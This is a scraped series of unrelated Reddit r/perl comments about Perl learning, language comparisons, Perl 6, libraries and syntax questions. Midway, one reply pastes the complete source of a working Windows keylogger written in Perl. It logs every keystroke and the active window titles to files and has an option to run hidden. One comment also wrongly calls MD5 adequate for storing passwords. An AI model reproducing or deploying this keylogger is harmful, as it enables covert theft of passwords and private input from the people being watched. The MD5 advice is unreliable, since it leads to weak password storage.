different kinds of things, and you can use closures from functional programming as your method implementations, and generally mix and match in awesome and absurd ways. In Perl, there is always a lot of room for play. As far as what's more or less OO, Python and Ruby aren't any "more OO" than Perl. They don't do "compile time type checking" (I had a module that does this in Perl, actually, but stopped maintaining it for lack of interest... it's odd that Java programmers can't fathom life without it but Perl programmers can't fathom life with it). There are no keywords in the language that control visibility of methods and instance data to limit them to package scope, class scope, or make them fully private. This is stuff you may decide you want if you have a large team of programmers working on a single codebase. There's no multimethod dispatch (aka overloading on type signature) in Perl 5, where you can create multiple methods with the same name but taking different typed arguments and having the compiler pick which one to use at compile time based on the types of arguments used to call it. Or maybe there's a module for that. Ruby and Python lack that too. In general, the "dynamic languages" (Ruby, Python, Pike, Perl, PHP) lag behind the non-dynamic languages (Java, C++, Haskell) a bit but offer other advantages. The pros and cons stem from early design choices when the language was created, specifically whether the compiler is going to try to figure out everything while it first "compiles" the code or if a lot of stuff is going to be intentionally left loose and resolved at run-time. Both designs have a lot of advantages, but the non-dynamic languages can claim some OO features that the dynamic languages can't. All of this hand waving is no substitute for actually spending a few days playing with Java and seeing exactly it does, though. Some languages (SNOBOL, Haskell, Ruby, C and Perl come to mind here) take some time to really "get". A lot of people intentionally pick languages that intentionally don't have a lot of dimension to them -- Python, Java, Scheme, and Forth come to mind -- and correctly guess that that style of language fits how you think. Perl itself is big. It has assortments of stuff from Simula/C++/whatever OO language, stuff from Lisp/functional languages, stuff stolen from BASIC, from sed, awk, even tidbits from SNOBOL. Larry stole liberally and readily admitted it. Just because one person doesn't know what some random thing in the language is for doesn't mean that a bunch of oldtimers or enterprising hackers don't ;) And Perl continues to steal. The sheer number of ideas in the language overwhelms a lot of people. In some languages, everything is a function or else an operator, or else everything is an API method, or else you have to use a lot of idioms, or else everything you need is in some module somewhere. In Perl, what you're looking for at any given moment could be any of those -- it could be documented in perldoc perlfunc, perlop, perlfaq (for idioms), perlmodlib (for included standard modules), or you might have to go to search.cpan.org and search for it in add-on modules. It takes time to get a feel for where different things are. The amount of stuff on CPAN is mindboggling. The point is, if it's "my language versus your language", you've already lost. You don't have to like any given language, but you should never be afraid of a computer language. Usually, one isn't just completely better than another, but different languages jive with how people think and work (or play!), and that becomes our favorite language -- if we get far enough in trying different languages. Happy hacking!
Don't be afraid to write baby-code. Use only the Perl constructs that you know. You have to start somewhere. Use only 'goto' for a while if that's what you can wrap your head around and remember the syntax for. Modifying a small program is sort of like writing something from scratch but gets you over a big hurdle. If you install the Alien::SDL module, it'll install the SDL system library for you and the Perl SDL module/building. Perl SDL comes with a bunch of little graphic examples. I started programming on the ATari 8 bit (a 600XL) and I'm still convinced that just being able to bang pixels onto the screen is the best way to learn. Start with the stuff in SDL::Gfx::Primitive. You can draw lines and set individual pixels. Make a one pixel "monster" chase your one pixel "character" and then go from there.
I fucking love you.
 &gt;You should investigate SHA5 or SHA256. &gt;I have been using sha 256, which is a cryptographic hash. From the OP. What is a hash collision?
You know how applying a cryptographic hash will give you an *n*-bit number, no matter how many bits of input you give it? There being an infinite number of potential inputs and a finite number of outputs, multiple inputs can produce the same output. That's a collision. The size of *n* and the quality of the hashing algorithm will reduce the likelihood of collisions. Clearer?
Fair enough.
Thanks anyway!
If you don't mind code in python, take a look at the cryptography course on Udacity: http://www.udacity.com/overview/Course/cs387/CourseRev/apr2012 There's a section on hashes and one of the quizzes has you creating a collision.
Thanks!
Yep - just pick up some little task you'd like to do and try it in Perl. That's pretty much how I got started - it's just "hey, I wonder how I'd do this in Perl?" time after time and all of a sudden you start wondering why you'd bother using anything else. :)
Ok, so I pretty much agree with the author but why does everything seem to revolve around PHP and Python nowadays? PHP pretty much took over Perl as a web language but it's close enough to Perl that I don't bother that much when switching back and forth but Python (that I hate, I know I shouldn't...) seems to be picking up pace especially with new developers. For some reason, I don't want Perl to become as second class citizen amongst programming languages. What can we do about it? The impression that I have is that outsiders either seem to think that it's boring or way too hard or that it encourages sloppy code while I think none of this is true. Sure OOP is not the easiest thing to start with on Perl but the procedural style for most scripts and administrative task is by far the most pleasant and the that I've found. I just don't get it.
The simple answer (but maybe the hardest) is to just keep writing cool new projects in Perl. A lot of languages get boosts in popularity from "cool" projects that are perceived game-changers in their particular field. Examples are Rails and Node.js. Both projects vastly increased the popularity of both associated languages. People flock to Python/Ruby as a result of their coolness factor, their many useful and popular modules, and also because of their very gentle learning curve. Ultimately when it concerns a tool that you are going to use every day, a gentle learning curve isn't worth much. The immaturity of their module system and surrounding ecosystem is what pushed me away from them and into Perl's welcoming arms.
TL;DR 1. CPAN 1. CPAN 1. CPAN 1. Philosophy 1. Fun!
Here's how to get started. I like to describe the process I plan to use to solve a problem in plain English first. So, open a text file, and before you write any code, start putting in little comments, like so: #!/usr/bin/env perl # read in the source text file # find each line containing the text I'm looking for # tally the instances of found strings # print the total to stdout # send an email to joe if no results found # send the results and the tally in an email to joe and sally if there are any Once you've done this, start writing code beneath each comment that does what you described. If you get stuck on a part, consult Dr. Google. Lather, rinse, repeat. Basically, the process of coding is to take a large (and often vague) problem, clarify it, break it down into tiny, manageable (and very specific) pieces, and then figure out each piece, gluing them together as you go. When you have all the pieces fleshed out, you can play around with refactoring and cleaning things up if you need to. That's pretty much it. 
They don't. You can work with whatever environment you like but at submission time you have to create the VM image. daxim (you can find him on various irc channels) created some scripts to automate this process. I too think this requirement is annoying though.
A very nice posting but your description of Perl is out of date. Like SNOBOL, the newest Perl regular expressions can do conditionals (if's) and looping (while's) inside a regular expressions. In fact, it is so advance that they are no longer called regular expressions but grammars because they can parse a language's grammar. In OO, Perl has Moose (and Mouse, Moo, etc). Not much different than conventional OOP but it introduces the Role, an abstract class with no parent. They are now exploring role-oriented programming (ROP), where all classes can only have roles as parents. Perl does not have datatypes but, then again, people don't think in terms of datatypes. Ask anyone on the street how to multiple by 10 and you get, "Add an zero to the end." This is not arithmetic; it's string manipulation. People think of numbers as strings that you can also do arithmetic on. The reason you need datatypes in large projects is because no-one creates an interface document for them. They use datatypes as an ad hoc method for one. The only time I have every seen an interface document was when one was required by contract. And in the first week after its release, hundreds of bugs were eliminated from the code.
As a self-learner myself, you need to identify a real-world problem, and then try and code a solution for it. Find something small to begin with. Is there something that you do that could possibly be automated?
yes and no, they will only respond if it is in there interest to. No matter how much they tell you they are there to help you find a job its a lie (kinda). They will only respond if they can gain money from it. It has nothing to do with providing a good service.
There are many types of languages out there, even though Perl is not object-oriented, it can do a lot of other things other languages can and beyond. A lot of those idiots are from the C++ community, considering they're too used to having their language do about anything. MD5 hashes are valid for storing passwords. 
It dosen't matter the age of your code - it still matters no matter what. All the code I write can be found circa 1997, and it still works fine. 
This is a programming subreddit, not an art gallery
To most casual viewers, PHP and Perl do look similar which isn't surprising giving where PHP gets its inspiration. It's just a shame their developers are useless and made the language so bad. Though you could look past that if it weren't for the fact even their documentation is piss poor and helps people learn to write bad code.
There's the binary and also C library provided as well. I'm fairly sure the Perl integrates into the C library. If the version changes, it needs to be recompiled because the underlying headers from C code have also changed.
Some feedback: * Not sure if "selected highlights" vs. "summaries" matters much. Some weeks you might want to write more details, other weeks less. :) (And some weeks may *have* more details than other weeks.) I'd say just play it by ear. * It would probably be useful to have a master ordered index of links somewhere to these blog posts (well, one master page for each year). * It would be useful to new readers who want to "catch up" (and read a bunch of them straight through) if each blog post contained a link at the bottom to the *next* one. * I'm interested to hear in these reports how the effort to get Rakudo to run on alternate backends is going. * Might be interesting to see links in these summaries to any new Rosetta Code examples that appear during the week being covered. * looks better without the &lt;font color="red"&gt;&lt;strong&gt;bold red bits&lt;/strong&gt;&lt;/font&gt; * Put the author's/editor's/compiler's name at the top. :) 
By same you mean what, same as before or same as the version of Image Magick?
The same version number as the installed Image Magick. From their website: &gt; ImageMagick must already be installed on your system. Next, get the PerlMagick distribution corresponding to the installed ImageMagick distribution (e.g., PerlMagick 6.79 for ImageMagick 6.7.9) and unpack it as shown below:
I don't know in this specific case. In general, a library is supposed to bump its SONAME when making backwards-incompatible changes, but maybe ImageMagick doesn't do that. I had mentioned previously in my comment (before deleting it) the GraphicsMagick library which is a fork of ImageMagick but with a more stable API. There's an equivalent (or mostly equivalent) perl binding `Graphics::Magick`. It might be worth switching for fewer hassles. 
Wait, that totally sucks. Image Magick is way ahead of Perl Magick. That means Perl users won't ever be able to make use of those bug fixes?
It's not too far back, though. I'm running 6.7.8-6; current ImageMagick is 6.7.9-3.
How is that possible? The latest Perl Magick is 6.77? http://imagemagick.mirrorcatalogs.com/perl/
This is so confusing. On the site they make it sound like PerlMagick is co-developed with Image Magick... That's nice, since they always match (at least in the zip I looked at). But then what is the Perl Magick on CPAN for? It's out of date.
I don't know what's up with CPAN, or why it's out of step with Image Magick. And I still want to know why installing a separate Perl module borked my installation of Image Magick + Perl Magic. After over a decade of using CPAN, I have never seen that before. That's what you expect to see in PHP. And yes, it is confusing. When I ran into this a few months back, I thought, "Simple. I'll just update them both." That's when I learned why the version is important.
It also [appears to be from 2005](http://sourceforge.net/projects/perllinux/files/perllinux/0.9.5/).
Thanks for your excellent feedback. * selected highlights vs summaries. I want to do whichever readers prefer. One reader has said they much prefer the bulkier summary. You seem to be saying you don't think the difference matters much. * [Master ordered index](http://blogs.perl.org/users/perl_6_reports/archives.html) * Catch up links. Use master ordered index? * Alternate Rakudo backends. I will use the tags #rakudo #altvm for relevant items. * I've done a few rosettacode links (tagged #rosettacode). But we probably want some regular sections for things like this. * I want to emphasize some entries, but I agree the bold and bright red is too much. * I will put my name up top. :) Thanks again. (Edit: typos and clarify "catch up links" point.)
[Perl Power Tools][1] on steroids! [1]: http://cpansearch.perl.org/src/CWEST/ppt-0.13/html/index.html
&gt; Master ordered index Oh, nice. &gt; Catch up links. Use master ordered index? That works alright. Though, for a given month, you have to read the articles up the page instead of down. 
Nice! 
Perl5 is more practical at this point. Perl6 is not yet complete, still beta. Perl6 will not replace Perl5, as the two languages are too different.
So, I should continue learning Perl5 than?
Yes, Perl 6 is still being developed. Even though it is nearly passing all the test specifications it's still not going to be as fine tuned as the latest perl 5 release. There is also a lot more perl 5 code and examples out there for you to learn from
Learn as many languages as you can because each will teach you something useful. (And the ones that won't teach you something useful will become easier to see once you have a few languages under your belt) That said, were I you, I'd continue learning Perl 5 (btw, which version of "Beginning Perl" are you using? The latest version is authored by Curtis "Ovid" Poe and published by Wrox) 
I am reading the one that is available free online http://www.perl.org/books/beginning-perl/. Author: Simon Cozens
Thanks :) I will continue my quest to learn Perl5.
I made a decision in 2001 to ignore Perl 6. I haven't regretted it for a second. I've been using Perl (5) as one of my primary languages in my career for ~10 of the last 20 years.
"Modern Perl" by chromatic is also available free online, and is very good. Read it after you finish BP.
~~ (aka smart matching) was introduced (for production-ready releases) in 5.10.0 (and its semantics slightly but importantly changed in 5.10.1) man perl5100delta man perl5101delta
Lucky you :) I, on the other hand, spent about 4-5 years waiting for Perl 6 to materialize. During that time I became not very productive, especially in Perl. Went to several other languages including Ruby, PHP, even Python. Eventually returned to Perl, with a new invigoration because I realized that Perl 5 is still very much alive while Perl 6 will still take years before being usable in production. I wish I could take those years back :( Don't make the same mistake as I did. Stop waiting and hoping for that perfect language, or the perfect tool, that does not yet (or will ever) exist. Work with what we have now. Make things happen, now.
Cool, I didn't know which release it came with.. i believe the clusters have 5.8 but i have 5.14... it's very powerful, but alas, I can't use it for my 'user friendly' pipelines...
Learn both, in that order. Knowing Perl 5 first will allow you to appreciate how much better the syntax of 6 is, and knowing Perl 6 will make it easier to understand all the backported advanced features in 5, like parts of Moose and the smart match operator (though that last one may as well be in Intercal for the way it was implemented).
Is there anyplace that lists the basic differences between Perl5 and Perl6, and the advantages of each?
I became more reluctant to write more code and release stuffs in Perl 5 because I felt that my code was going to be obsolete soon enough. I did maintain existing programs in Perl 5 and other languages, but the number of new code that I wrote certainly gone down much. 
Hi harbud3, I see that you waited for Perl 6 in vain. Depending on your needs, it may still not be ready for you. That sucks. I consider what you've just said to be unfair aspersions cast in the direction of Perl 6. I will explain below. Please consider how negative commentary such as yours hurts those who continue to develop Perl 6, including Larry Wall, the author of Perl. I'm pretty sure most or all of perl6.org has always been static html, which means it's some of the fastest web site content out there. Since late 2009 this static content has been generated by mowyw. Moritz Lens wrote mowyw. It's perl 5 code. I very much doubt it's slow, but even if it was, it doesn't impact the web site's speed because it's doing the generation offline. Carl Mäsak wrote a Perl 6 blog engine that generates his blog http://strangelyconsistent.org. This engine is Perl 6 code, but once again, that fact can not impact the blog's speed, because, like mowyw, it also generates the site offline. And, once again, the generated output is static html, which means it's some of the fastest web site content out there. 
These are sites "talking about Perl", not "built by perl"
Even though it cannot be tracked by Alexa I would put reddit.com/r/perl on there as well. It is a firehose like perlbuzz for all things Perl.
Perl 5 is the Cat's Maracas! I use it every day to brutally slay the most fiendish of problems in a welter of binary gore!
It would be cool to have a list of popular websites that are built by Perl. It would be an awesome showcase.
&gt;You can't put a list inside another list. What does the author mean by this? print "I love $_\n" for "apples", more_fruits(), "oranges"; sub more_fruits { return 'lemons', 'pineapples'; } Or if you want to put something into an existing array, you could use splice. my @array = qw|1 2 3 4|; splice @array, 2, 0, qw|5 6 7|; print "@array"; #1 2 5 6 7 3 4 Also, is there an official statement by perl's creators that we shouldn't be using shortcuts? If you can write readable code while using shortcuts, why not use them?
&gt; What does the author mean by this? Some people think parentheses create lists in Perl 5 and complain that lists aren't first-class data structures in Perl 5 such that when you write: my @rray = ( 1, 2, 3, ( 4, 5, 6, (7, 8, 9) ) ); ... you don't get nested arrays. I use the words "list" and "array" very deliberately there. In other news, if you cobble together syntax and features from other languages without regard for how Perl works, Perl doesn't always work the way you might expect.
I see. I wonder who put him a perl teacher.
The bit I liked is when Java programmers think that Perl having fewer rules would be an obstacle to getting things done. When I first saw Java, knowing only Perl, I thought the same thing. 
Wouldn't you agree that references do make this matter needlessly confusing. In any other scripting language (Ruby, Python, JS) the example above would "just work".
To anyone that doesn't know perl, yes. Just like $_ and the different syntaxes.
I love you, Sam, but you don't actually know Perl.
This isn't an issue with references per-se, this is an "issue" with auto-flattening. If you did `my $arrayRef = [ 1, 2, 3, [ 4, 5, 6, [ 7, 8, 9, ] ] ];` then you *would* get the "expected result".
"Everything's implicitly a reference" has it's own weirdnesses.
I had no idea Perl could be used to build/power websites. 
&gt; I express no value judgment, but rather the tradeoff. Half the flamewars on the internet could have been prevented by this sentence.
You should check out [Perl Dancer](http://perldancer.org). I used it to build [Crowdtilt](https://www.crowdtilt.com)
You're probably thinking of [November](http://www.perlfoundation.org/perl6/index.cgi?november) by viklund and masak.
Hi raiph, I apologize. The glacial comment is actually a joke in response to RalphMacchio's comment about refreshing perl6.org and was not meant to be spiteful or hurtful. I should also explain my previous comment about waiting for Perl 6. I am not bitter, in the end I learned a valuable lesson. And the lesson is not to avoid learning/getting involved with Perl 6 altogether, but to be pragmatic and realistic.
&gt; A formalized AST between the parser and the code generator, with the ability to manipulate the AST and inject new subtrees in pure Perl 5 Do want
[Google?](http://dl.packetstormsecurity.net/trojans/win-keylogger.txt) # Projeto para estudo / Project to study # Simples keylogger para WINDOWS - Teclado (Pt-Br com cedilha (Ç,ç)) / # Simple keylogger for WINDOWS - keyboard (Pt-Br with cedilla (Ç,ç)) # By Mdh3ll # mdh3ll@gmail.com # Brazil ############################################################################# # This program is free software: you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation, either version 3 of the License, or # (at your option) any later version. # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # You should have received a copy of the GNU General Public License # along with this program. If not, see &lt;http://www.gnu.org/licenses/&gt; ############################################################################# use strict; use warnings; use Win32::GuiTest qw(GetAsyncKeyState GetForegroundWindow GetWindowText); use Win32::KeyState qw(:get); # this module here -&gt; http://tinyurl.com/3xdmbrx use Time::HiRes qw(usleep); use FileHandle; use Switch; my($caps,$ced,$i,$I,$shift,$window,$window0,$LOG); $|++; $I=0; $window = 0; open (OUT, "&gt;&gt;outkey".$I.".txt") || die "could not create test.out - $!"; # out OUT-&gt;autoflush(1); # ShowWindow(GetForegroundWindow(),SW_HIDE); # REMOVE THE # TO START HIDDEN. LOG("=" x 40 . "\n" ." [+] started : ".~~localtime(). "\n" . "=" x 40 . "\n"); while(1){ if(-s OUT &gt;= 1048576){ close(OUT); $I++; open (OUT, "&gt;&gt;outkey$I.txt") || die "could not create test.out - $!"; } $window0 = GetForegroundWindow(); # capture the active window title. if($window0 != $window){ $window = $window0; LOG(GetWindowText($window)."\n");} if(GetKeyState(20)==0){$caps=32;$ced=0;}else{$caps=0;$ced=7;} #checks the state of CAPSLOOK. for(8,9,13,16,32,187..193,219..222,226){ $i = $_; if(GetAsyncKeyState($i) == -32767){ switch($i){ case 8 {LOG ("\b")} case 9 {LOG ("\t")} case 13 {LOG ("\n")} case 16 {callSHIFT()} # call sub callSHIFT. case 32 {LOG(' ')} case 187 {LOG('=')} case 188 {LOG(',')} case 189 {LOG('-')} case 190 {LOG('.')} case 191 {LOG(';')} case 192 {LOG('\'')} case 193 {LOG("/")} case 219 {LOG('\\\'')} # (´) case 220 {LOG(']')} case 221 {LOG('[')} case 222 {LOG('~')} case 226 {LOG('\\')} } } } for($i=48;$i&lt;=57;$i++){ # Numbers 0-9. if (GetAsyncKeyState($i) == -32767){ LOG(chr($i)); } } CHR($caps,$ced); usleep(1000); # reduces consumption of CPU. } sub callSHIFT { $shift = 1; while($shift == 1){ for(48..57,187..193,219..222,226){ $i = $_; if(GetAsyncKeyState($i) == -32767){ switch ($i){ case 48 {LOG(')')} case 49 {LOG('!')} case 50 {LOG('@')} case 51 {LOG('#')} case 52 {LOG('$')} case 53 {LOG('%')} case 54 {LOG('¨')} case 55 {LOG('&amp;')} case 56 {LOG('*')} case 57 {LOG('(')} case 187 {LOG('+')} case 188 {LOG('&lt;')} case 189 {LOG('_')} case 190 {LOG('&gt;')} case 191 {LOG(':')} case 192 {LOG('"')} case 193 {LOG('?')} case 219 {LOG('/\'')} # (`) case 220 {LOG('}')} case 221 {LOG('{')} case 222 {LOG('^')} case 226 {LOG('|')} } } } CHR(0,7); if(!GetAsyncKeyState(16) == 1){ $shift = 0; } # checks the state of SHIFT. } } sub CHR { $caps = shift; $ced = shift; for($i=65;$i&lt;=90;$i++){ if(GetAsyncKeyState($i) == -32767){ LOG(chr($i+$caps)); } # letters a-z A-Z } if(GetAsyncKeyState(186)== -32767){ LOG (chr(135-$ced)); } # Cedilha Ç,ç usleep(1000) # reduces consumption of CPU. } sub LOG { $LOG = shift; print $LOG; print OUT $LOG; }
Sorry, I wasn't aware, but I guess it doesn't really matter.
Understood, I got lucky and found source right away though, so I was just being cheeky.
A little more stability would be nice.
Thanks!
something like open(my $xinput, '-|', 'xinput test DEVICE_ID'); while (my $line = readline($xinput)) { print "$line"; # do stuff } Haven't tested that code fragment, but hopefully that helps.
The post linked to from the above page is well-worth a read: http://www.modernperlbooks.com/mt/2010/10/reinventing-the-axle.html A quote from the link: &gt; Wouldn't it be nice if shared libraries could provide some sort of machine-parseable, semantics-preserving, declarative (that is, no cpp necessary!) file which all of us poor users could parse once with our thunk generators to produce bare-bones, no sugar added interfaces to these wonderful libraries, then get on with the interesting work such as building Pygame and SDL_perl in wonderfully Pythonic and Perlish ways instead of manually reading SDL_video.h and figuring out how to map all of that implicit information into XS ourselves? This is exactly what CLR (and, to a lesser degree, JVM) provides. May the right question be: when will Perl be ported to CLR and/or JVM?
CIA or FBI?
Yes i see now
Wow this looks great, I suppose it's running Perlito as an engine for the examples?
Hi again! I tried looking that up like you said, but all i find are shitty visual basic screen cap programs, do you know of any specific websites I can find what I'm looking for on? Sorry to bother you again.
Literally everything? Like `ls` and `chmod` and `more` are all recreated in Perl?
Everything that isn't the kernel itself and the perl interpreters.
I can't *wait* for operating systems to catch up and join the wave of the future: cooperative multitasking.
try using while instead of foreach on the outer loop
This is the right answer. See http://stackoverflow.com/questions/585341/whats-the-difference-between-iterating-over-a-file-with-foreach-or-while-in-per
They may have covered things in enough detail, but I found this article interesting: Memory-map files instead of slurping them http://www.effectiveperlprogramming.com/blog/44 
You can't make blanket statements like that. There are horrible developers in every language.
I'm not saying there aren't good PHP developers (I'm friends with one) but my point is there are so many more PHP developers of all variety that it's far easier to get someone who will accept less pay. Perhaps it's different elsewhere but PHP jobs here are consistently at least £5,000 less than developer jobs in other languages. They don't need to pay more and even when they pay a couple thousand more than I made packing this in boxes in a factory they still fill the roles and that is because there will be someone to fill it. So in this economy if you want to save money on a website do it in PHP. You can probably even save on a designer and get a designer who codes PHP. He won't do the best job from a coding point of view but it will look nice and you probably will get pretty far without anyone noticing it runs like a dog and is insecure. You'd be hard pressed though to find a designer who codes Java, Perl or even to a lesser extent Python. I think that is solely down to the wealth of free hosting options for PHP that are easy to use. You don't get that in other languages so you typically have to take them further before you can branch out and work for others.
the &lt;FILE&gt; operator behaves differently in list context from scalar context. In a list context it returns a list consisting of every line in the file, whereas in scalar context it just returns the next line from the file. Typing foreach (&lt;FILE&gt;) { ... is therefore equivalent to my @lines = &lt;FILE&gt;; foreach (@lines) { ... 
ah, i see. it is mindless pedantry to distinguish between two very different things in the language (things which newbies often mix up, no less).
I predict Perl will be running fairly nicely on either or both of CLR and JVM one year from today. Perl 6, that is. Which means Perl 5 too, fsdo Perl 5, via STD_P5 and its offspring. (And while it's definitely not what chromatic suggests, [Perl 6's FFI](https://github.com/jnthn/zavolaj) is nice.) 
&gt; I predict Perl will be running fairly nicely on either or both of CLR and JVM one year from today. I foresee you asking a haberdasher for a menu and some salt.
This is another script to calculate pi, this one uses the Nilakantha convergence. this script calculates 14 digits of pi in less than 65 thousand calculations, making it way more efficient than the Leibniz convergence http://pastebin.com/LpDRxi1C
This series is my favorite. I used it recently in [a demonstration of combining CSSS and Mathjax for slideshows](http://www.cleverdomain.org/pi-slide/).
Alexa ranking is a very bad indicator for popularity, since data is only collected for visitors that have the Alexa Toolbar installed. Which results in a very strong selection bias towards a specific user group, a better title would have been "Top 23 Perl-based open source products, among SEO professionals".
Peter Norvig has explained that very well [here](http://norvig.com/logs-alexa.html).
While Alexa clearly has some very incorrect data - and I'll write about that later - that "SEO professionals" thing is probably a very incorrect assumption. Alexa allows you to create your own branded toolbar and include the Alexa counter in it http://www.alexa.com/toolbar-creator So there might be hundreds or thousands of different toolbars offered by lots of web sites that are for the general population, but still report back to Alexa.
It still biases the data towards people who use toolbars at all.
Claiming that this is biased towards a "core group of SEO enthusiasts," or "SEO professionals" as prgt wrote above, is misleading. It uses the "SEO" = "bad marketing people" feeling of the technical community to make a point. 
Before this "is Alexa biased" discussion goes further (or maybe I can't avoid it:) I am changing the title: s/Top 23/All 23/ There, so instead of fighting me over Alexa, please find more Perl-based products to include in the list.
Well, one you're missing because it's not the sort of thing to show up in Alexia type lists, despite being used by millions of people (directly or indirectly): http://koha-community.org/ http://wiki.koha-community.org/wiki/Koha_Users_Worldwide
It also biases the data towards projects where many people go to the sites, which I would suggest isn't true in a lot of cases. So if the project is something that tends to be centrally installed and then used by the members of an organisation (for example), it won't be reflected accurately at all.
Thanks for the link, I completely forgot about Koha. We are up to 25 projects. BTW What is http://www.koha.org/ and why 2 sites?
Now basically there are 2 projects called Koha using almost the same code-base. I see, isn't there a non-profit around the Koha project that would take legal actions?
There's no real legal avenue to take, unfortunately. The community was formerly a bit too trusting for its own good. 
sub func2{return \@y};
Can you please clarify a bit more on the "context" and as to why it is returning a 3
server code: https://gist.github.com/3739158 client code: https://gist.github.com/3739174
Assuming you're using perl &gt;= 5.14, there are [two forms of `push`](http://perldoc.perl.org/functions/push.html), and you are running into the second form, because a function call is not ARRAY, so it's EXPR. The first form looks like this: my @foo = qw/1 2 3/; push @foo, 5; 
Yes, am using Perl 5.14.
Can you suggest me the best reference available for *context, references* for a beginner.
Thanks
You have received several correct answers, but none of them are really "like you're five", so here goes. Your code is returning a *list* not an array. You can think of a list as being like a temporary, anonymous, immutable array. You can do most things to a list that you can do to an array, but you can't modify it. In the line my @y = (2,3,4); `@y` is an array, and `(2,3,4)` is a list. You can assign a list to an array, and convert an array to a list by using parenthesis like `(@y)`. However, while you can return a list (and assign that returned list to an array) you cannot directly return an array - it will automatically get converted to a list. As pointed out by others, to do what you want to do, you need to return a reference to an array, using the `\` operator (similar to the `&amp;` addressof operator in C.) You can use an array reference directly in `push` (although in older versions of perl you needed to de-reference it.) For more details on references, check out the [perlref](http://perldoc.perl.org/perlref.html) manpage. (N.B. *After* a long and complex section on closures in that manpage, the following line appears "Closure is not something that most Perl programmers need trouble themselves about to begin with." That should probably be at the beginning.)
&gt; ... convert an array to a list by using parenthesis like (@y) *Context* does the conversion. Those parentheses are irrelevant.
Thanks. Awesome explanation :)
What's wrong with [perl -d](http://perldoc.perl.org/perldebug.html)?
The Eclipse EPIC plugin with PadWalker will let you use the eclipse debugger.
what is your biggest frustration with Perl?
"TIMTOWTDI" takes a lot of the tediousness out of writing code, but makes reading someone elses Perl very hard. Not only do you have to follow the other programers logic, you have to know every trick and shortcut in Perl that they know. 
How about perl -d plus emacs gud? I find that it's got the right mix of command line and gui flavours for me. 
Good GUI can be fantastic. Bad GUI are often worse than noting at all. At the bottom the GUIs provide interface to the perl command line debugger. As you learn how to do things in the gui you are, for the most part also learning how to do them in the command line debugger at the same time. Since the perl debugger has a way to step over subroutines I suspect that the gui tools do too.
Bingo! &gt; ...you have to know every trick and shortcut in Perl that they know. that is the perl problem
Padre is at version 0.96. Eclipse is at 4.2. Eclipse should be more polished than Padre. Try compare similar versions. And Padre uses the built-in Perl debugger; it just puts a GUI wrapper around it.
The problem is not Perl, but Perl programmers who like to show off. This is the result of our education system, which awards students for impressing the teacher. The problem could be reduced if the education system taught better communication skills.
That's a striking conclusion to draw from reading that article. The MAIN processing described only covers some (80%? 99%?) of cases, not all, but what leads you to completely reject their evident simplicity for those cases?
Came here for this. Up votes for you. 
On the other hand, it can exercise and improve your reading skill :) 
Hi! Perl will never automatically convert 0000 to 0. Further, all scalars can be considered either a string OR an integer OR ..., depending on the operation used on it. If you are comparing MD5 digests, use "eq" instead of "==" as "eq" is the binary operator for comparing strings ' equality. Can you provide more detail? How are you storing it? What operation precisely are you doing?
I was just at a job fair in Chicago talking to a guy from cars.com. He said in their California offices, they can't get decent PHP programmers to save their lives.
There is a difference between getting no applications and only getting bad ones. Did you make it clear which it was? I'd personally prefer no applications myself. I never liked it when I had to interview people who clearly weren't cut out for the job.
You should probably be using perl's version of the for loop. The code is a bit cleaner that way. for ( grep { ref eq 'CODE' } @_ ) { print "Converting code ref to async routine\n"; my $s = $_; # keep a pointer to this memref. # create a new memref my $n = sub { async { $s-&gt;( @_ ); } @_ }; $_ = $n; }
Currently I think contributions to http://doc.perl6.org/ (sources at https://github.com/perl6/doc/ ) will have a better chance at reaching a wider audience. Currently it's mostly reference style, but tutorial-style contributions are also accepted.
`system`, `fork` (optionally w/`exec`), backticks aka `readpipe`, `open`, and about a hundred modules using one or more of the above, including `IPC::Open2`, `IPC::Open3`, `IPC::Run`, `IPC::System::Simple`, and if you're counting `fork`-without-`exec` as "starting a process" (which you arguably should), then many more like `Parallel::ForkManager`, `Proc::Daemon` etc.
Here's one that's probably not on most people's list: use warnings; use strict; my $ret = stupid_system("ls -l"); print "command finished with return code $ret\n"; sub stupid_system { my $command = shift; my $filename = "/bin/sh"; my @argv = ("sh", "-c", $command, undef); my @envp = (map("$_=$ENV{$_}", keys %ENV), undef); require 'syscall.ph'; my $pid = syscall &amp;SYS_fork; syscall &amp;SYS_execve, $filename, pack("p*", @argv), pack("p*", @envp) if $pid == 0; waitpid $pid, 0; return $?; } This is totally unix-specific and stupid, you should not use this. 
&gt; Here's one that's probably not on most people's list: Here's another one, somewhat teleological :): spawning process behind the socket (via [inetd](http://en.wikipedia.org/wiki/Inetd)).
It's generally used to set a default value if a user hasn't specified something. However with that code, if $val is a '0' - then it will evaluate to false and get set to '2' anyway. There is the '//' operator (aka "Defined Or": http://perldoc.perl.org/perlop.html#Logical-Defined-Or) that is better suited for that task, and came in as part of perl 5.10 IIRC. 
Remember that || is a short circuit operator and $val ||= 2 is just shorthand for $val = $val || 2. So if $val is true (set to anything other than zero or empty-string), the 2 part of that never occurs and it will retain its current value.
Orthogonality. If you're throwing in operators like +=, -=, &amp;=, etc., then you might as well put in ||=, too. As LoonyPandora notes, //= is preferred for most practical uses after 5.10.
It's essential to know what values qualify as 'false' in Perl: * an undefined value * the integer * an empty string * an empty array ||= is like +=, -=, *=, /=. &amp;=, etc, and in newer Perls, add //= .... $a x= $b for some operator 'x', is equivalent to $a = $a x $b $a ||= $b =&gt; $a = $a || $b If $a is true, then it remains unchanged, but if it is false, $a takes on the value $b. This is useful for assigning default values to command line arguments or in other situations, but it leads to a problem when the passed-in argument is an empty string or zero. That's why //= was invented for Perl 5.10: $a //= $b =&gt; $a = ( defined $a ? $a : $b ). ( explaining the ternary operator ?: is a different thread ). Another topic to keep an eye out for is methods for returning the number zero as a true value. You'll find it in DBI, for example. Routines that return data have a return value; some functions, such as do(), returns the number of rows affected. When rows are returned or rows are affected, the return value qualifies as true. When an error occurs, they return undef, which is false. In between is the situation when zero rows are returned, or zero rows affected. It can be quite valid, if the where clause doesn't match any records in the database. In such a case, "0 but true", is one of several values which numify to zero but boolify to true.
LHS?
Left Hand Side
It seems redundant in your example. Surely you mean: my $arg = $ARGV[0] || $ENV{'COMPUTERNAME'} You are setting $ARGV[0] first, and then setting $arg. This may have unintended consequences (probably not in your circumstances), and it's always a bit... iffy... setting what are essentially constants.
Ah, ta.
